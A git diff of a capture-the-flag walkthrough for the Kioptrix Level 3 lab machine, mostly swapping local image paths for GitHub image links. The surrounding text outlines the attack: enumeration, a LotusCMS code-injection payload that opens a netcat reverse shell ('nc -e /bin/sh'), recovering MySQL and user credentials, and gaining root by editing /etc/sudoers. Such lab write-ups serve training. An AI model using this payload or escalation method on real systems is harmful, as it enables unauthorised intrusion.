@@ -106,37 +106,41 @@ Netdiscover
 
 Discovering the vulnerable system with netdiscover -r 192.168.20.0/24
 
-![](media/c98ca3235f64defb3e1b206823c2c3d8.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/netdiscover.png?raw=true)
 
 Nmap
 ----
 
 Nmap all ports scan:
 
-![](media/bdebc9a1622bda702de59d1a8cba6d89.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/nmap.png?raw=true)
 
 Nmap version, default script and aggressive scan:
 
-![](media/739507f2663cc7110a8813b0d09bb6e1.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/nmap%20sv.png?raw=true)
 
 Port 80 Enumeration
 -------------------
 
 ### Nikto
 
-![](media/2d82e3280a41e5d4927f696d88de65ef.png)
+Scanning for web application vulnerabilities with Nikto
+
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/nikto.png?raw=true)
 
 ### Gobuster
 
-![](media/e2db5d0674e1b48ae129917a22cb698f.png)
+Scanning for hidden web directories with GoBuster
+
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/gobuster.png?raw=true)
 
 ### Browser
 
-![](media/8da3660a33818dd35a7dcf9e29b25fc2.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/browser.png?raw=true)
 
 Discovering that the underlying software is LotusCMS
 
-![](media/bfe9bcc9e7a42eebe68cb33422a78da8.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/Discovering%20Lotus.png?raw=true)
 
 Low Privilege Shell
 -------------------
@@ -145,28 +149,28 @@ Low Privilege Shell
 
 Discovering a python exploit via google search:
 
-![](media/edb701ca17a1d481f61c3f74f18e2a51.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/python%20exploit.png?raw=true)
 
-![](media/6155fb0f7e58682070381f4f75491297.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/python%20exploit2.png?raw=true)
 
 Copying the exploit to the attacking system and running the exploit:
 
-![](media/823af45a6f6724a69f904f0afbe4237e.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/copying%20exploit.png?raw=true)
 
 Low Privilege shell:
 
-![](media/db10a99bf99e9d3a67ef9fd0a1d05dc4.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/LowPrivilige%20shell.png?raw=true)
 
 ### Harder way (manual exploit)
 
 Searching exploit-db for suitable exploit:
 
-![](media/9195a1ce60a06c2ba762a1cecc4ab2d3.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/exploit-db.png?raw=true)
 
 Looking through the source code to see how the exploit works and how the payload
 is crafted (notice variable stub and variable sploit):
 
-![](media/5f9f7f18c7833f63030606d18caf8d39.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/Looking%20Through.png?raw=true)
 
 From this we deducted that payload comes after ‘); and between \${payload}
 characters.
@@ -178,7 +182,7 @@ The payload is the following: ');\${system('nc -e /bin/sh 192.168.20.144
 
 First the payload has to be url encoded:
 
-![](media/2546f2b8184e9e9753e86fac0d7ee44f.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/URL%20encoded.png?raw=true)
 
 Next we append our encoded payload to the url after page=index.
 
@@ -187,57 +191,57 @@ Next we append our encoded payload to the url after page=index.
 After starting netcat listener on port 443 the shell is obtained, and the shell
 is upgraded to TTY shell via python:
 
-![](media/f284e16d7cd8817776de38a49302797f.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/netcat.png?raw=true)
 
 Privilege Escalation
 --------------------
 
 Enumerating operating system version and kernel version
 
-![](media/dacc12db4627a588d0dbac117c176332.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/enumerating%20operating.png?raw=true)
 
 Enumerating users present on the system:
 
-![](media/b4e2c8f48ebac64ad33959ae5321961b.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/Enumerating%20Users%20present.png?raw=true)
 
 Enumerating web server directory for MySQL credentials:
 
-![](media/f369b75035676c666dd6b93cb1ce1508.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/enumerating%20web%20server%20MYSQL.png?raw=true)
 
 As per screenshot below, MySQL credentials for root have been discovered:
 
-![](media/b4d6773aee437bca7ded63aa3f7f3cbe.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/mysql%20credentials.png?raw=true)
 
 Enumerating MYSQL database:
 
-![](media/86c52b8e5b7916d2fde568f1b50349e9.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/EnumeratingMySQL.png?raw=true)
 
 Discovering credentials for users dreg and loneferret:
 
-![](media/d2af5462810fcd83d6f623026b83f75e.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/dreg&ferret.png?raw=true)
 
 Using Hashkiller to bruteforce the hashes found (john can be used, but for quick
 unsalted hashes I find Hashkiller to be much quicker)
 
-![](media/d98e3010d010afac24b59cc9d49a7937.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/hashkiller.png?raw=true)
 
 Logging into loneferret’s account and discovering his sudo priviliges:
 
-![](media/fcfbfc633c8d078df1586bb7cbe5c141.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/loneferret(sudo-l).png?raw=true)
 
 After a quick google search it’s determined that HT is a hex editor available
 for Linux (quick idea to escalate privilege is to edit /etc/sudoers file to add
 additional privileges to loneferret’s account):
 
-![](media/73316919a171c027a9e61a5c496e842a.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/ht_google.png?raw=true)
 
 From here SSH can be used to obtain a better shell:
 
-![](media/cd5739e52b3e544e6ec0b80e46ff6c88.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/ssh.png?raw=true)
 
 When trying to run the executable SSH session prints the following error:
 
-![](media/0a2737d8d822abf8bdcd21b317429200.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/trying_to_run_ht.png?raw=true)
 
 To overcome this issue, xterminal can be exported with the following command:
 
@@ -245,24 +249,24 @@ export TERM=xterm
 
 Now when sudo ht is ran HT editor application opens:
 
-![](media/6f8a59405647f3b784018ec44f083311.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/sudo_ht.png?raw=true)
 
 By pressing F3, a file can be opened.
 
-![](media/3f0c051249e0f113fa34bb4c7b1e2f7d.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/F3.png?raw=true)
 
 In this case since loneferret already has some sudo privilege, all there is to
 do is add extra functionality. To make things easy /bin/bash has been added to
 loneferret’s sudo privilege in /etc/sudoers file.
 
-![](media/9a554b6c24b54ce5177a4b416c7eb54b.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/etc_sudoers.png?raw=true)
 
 By pressing F2 the file can be saved.
 
 Once sudo /bin/bash command is executed the root privileges are gained.
 
-![](media/213d2f15adbf0f60c64830dee9eb9354.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/root.png?raw=true)
 
 Congrats.txt:
 
-![](media/0ca82ea2d0f0ab4e291b51f059cacf84.png)
+![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%203/Images/congrats.png?raw=true)
